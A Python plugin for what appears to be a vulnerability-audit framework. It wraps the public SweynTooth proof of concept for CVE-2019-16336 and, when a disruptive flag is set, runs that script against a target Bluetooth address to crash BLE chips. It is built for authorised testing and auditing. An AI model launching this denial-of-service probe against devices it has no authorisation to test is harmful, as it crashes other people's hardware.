#!/usr/bin/env python3
"""CVE-2019-16336 – SweynTooth BLE: Link Layer Length Overflow – Cypress/NXP BLE SoC crash via oversized LL PDU.

Public PoC source: https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks
  Script: link_layer_length_overflow.py
  (Matheus Eduardo Garbelini, ASSET SUTD, 2020)

Hardware requirements:
  - nRF52840 USB dongle flashed with SweynTooth firmware
    (flash_nRF52_driver_firmware.sh in repo)
  - OR ESP32 board with BLE HCI
  Dongle port: /dev/ttyACM0 (override with serial_port= param)

Dependencies:
  pip install scapy colorama timeout_lib
  (drivers/NRF52_dongle.py from repo)

Usage:
  python link_layer_length_overflow.py /dev/ttyACM0 <target_bdaddr>
"""
from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 70,
    "cve": "CVE-2019-16336",
    "year": 2019,
    "domain": "wireless",
    "vendor_product": "BLE SoC / Bluetooth Low Energy stack",
    "component": "BLE Link Layer / ATT / L2CAP / SMP",
    "type": "BLE protocol fuzzing → DoS / auth bypass",
    "summary": "Link Layer Length Overflow – Cypress/NXP BLE SoC crash via oversized LL PDU",
    "source_url": "https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks",
    "requires_manual_review": True,
    "affected": [{"vendor": "Multiple BLE SoC vendors",
                  "product": "BLE chipsets",
                  "versions": [{"version": "pre-2020 patch", "status": "affected"}]}],
}

SWEYN_REPO   = Path(__file__).parent.parent.parent /     "public_poc_sources/repos/Matheus-Garbelini__sweyntooth_bluetooth_low_energy_attacks"
SWEYN_SCRIPT = SWEYN_REPO / "link_layer_length_overflow.py"


def _run_poc(plugin):
    serial  = (plugin.params or {}).get("serial_port", "/dev/ttyACM0")
    target  = (plugin.params or {}).get("target_bdaddr", "")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2019-16336",
        "sweyntooth_script": str(SWEYN_SCRIPT),
        "script_present": SWEYN_SCRIPT.exists(),
        "hardware_required": "nRF52840 USB dongle @ /dev/ttyACM0",
        "attack_surface": "Cypress CYW / NXP KW40Z BLE link-layer PDU length overflow → DoS/crash",
    }

    if allow_disruptive and SWEYN_SCRIPT.exists() and target:
        cmd = ["python3", str(SWEYN_SCRIPT), serial, target]
        evidence["command"] = " ".join(cmd)
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30,
                                  cwd=str(SWEYN_REPO))
            evidence["rc"]     = proc.returncode
            evidence["stdout"] = proc.stdout[:600]
            evidence["stderr"] = proc.stderr[:300]
            evidence["crashed"] = ("crash" in proc.stdout.lower() or
                                    "dead" in proc.stdout.lower() or
                                    "overflow" in proc.stdout.lower())
        except subprocess.TimeoutExpired:
            evidence["detail"] = "Probe timed out (target may not be in range)."
        except Exception as exc:
            evidence["detail"] = str(exc)
    else:
        evidence["detail"] = (
            "Supply target_bdaddr= (e.g. AA:BB:CC:DD:EE:FF), "
            "serial_port= (nRF52840 dongle), allow_disruptive=true."
        )

    return {
        "vulnerable": evidence.get("crashed"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": f"Matheus-Garbelini/sweyntooth / {SWEYN_SCRIPT.name}",
    }


class Poc90CVE201916336SweynToothBleAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-WIRELESS-090"
    meta_poc_name   = "CVE-2019-16336 SweynTooth Link Layer Length Overflow – Cypress/NXP BLE SoC crash via oversized LL PDU"
    meta_cve_id     = "CVE-2019-16336"
    meta_severity   = "High"
    meta_protocol   = "bluetooth"
    meta_target_os  = ["embedded", "linux"]
    meta_required_params = ["target_bdaddr"]
    meta_optional_params = ["serial_port", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks"
    meta_attack_surface = "Cypress CYW / NXP KW40Z BLE link-layer PDU length overflow → DoS/crash"
    is_disruptive   = True
    meta_destructive_level = "ServiceDisruption"

    def check_prerequisites(self):
        return bool((self.params or {}).get("target_bdaddr"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
